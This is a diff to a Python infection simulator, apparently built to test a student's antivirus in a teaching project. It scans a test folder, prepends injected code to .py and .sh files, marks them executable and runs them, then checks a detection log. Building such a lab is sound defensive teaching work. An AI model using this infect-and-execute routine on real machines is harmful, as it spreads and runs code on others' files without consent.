@@ -1,6 +1,11 @@
-
 import os
 import subprocess
+import time
+import sys
+sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
+
+from modules.utils import log_summary
+
 
 INFECTION_MARKER = "#infected"
 INJECTION_CODE = (
@@ -11,9 +16,24 @@ INJECTION_CODE = (
 
 TARGET_DIR = "/home/korban/Desktop/TestInfected"
 TARGET_EXTENSIONS = ['.py', '.sh']
+DETECTION_LOG = "/tmp/detection_result.txt"
+
 
 def is_infected(content):
     return INFECTION_MARKER in content
+
+def clear_detection_log():
+    try:
+        open(DETECTION_LOG, "w").close()
+    except:
+        pass
+
+def was_detected():
+    try:
+        with open(DETECTION_LOG) as f:
+            return bool(f.read().strip())
+    except:
+        return False
 
 def infect_file(filepath):
     try:
@@ -23,20 +43,16 @@ def infect_file(filepath):
         if is_infected(content):
             return
 
-        # הוספת shebang לקבצי .sh אם חסר
         if filepath.endswith('.sh') and not content.startswith("#!"):
             content = "#!/bin/bash\n" + content
 
-        # כתיבה מחדש עם קוד ההדבקה
         with open(filepath, 'w') as f:
             f.write(INJECTION_CODE + content)
 
-        # מתן הרשאת הרצה
         os.chmod(filepath, 0o755)
 
         print(f"[+] Infected & executing: {filepath}")
 
-        # הרצה בפועל
         if filepath.endswith('.py'):
             subprocess.run(['python3', filepath])
         elif filepath.endswith('.sh'):
@@ -52,5 +68,26 @@ def scan_and_infect(directory):
                 filepath = os.path.join(root, filename)
                 infect_file(filepath)
 
+def run_student_antivirus():
+    path = "/home/korban/ByteMeProject/backend/src/tmp/student_antivirus.py"
+    subprocess.run(["python3", path])
+
 if __name__ == "__main__":
+    log_summary("סימולציית הדבקה הופעלה", "system")
+
+    print("[*] שלב 1: ניקוי קובץ זיהוי")
+    clear_detection_log()
+
+    print("[*] שלב 2: הרצת אנטי וירוס של התלמיד")
+    run_student_antivirus()
+    time.sleep(1)
+
+    print("[*] שלב 3: הדבקה והרצה בפועל")
     scan_and_infect(TARGET_DIR)
+    time.sleep(1)
+
+    print("[*] שלב 4: בדיקת זיהוי")
+    if was_detected():
+        log_summary("זוהה תהליך הדבקה trigger_ransom.py", "success")
+    else:
+        log_summary("לא זוהתה הדבקה בזמן", "fail")
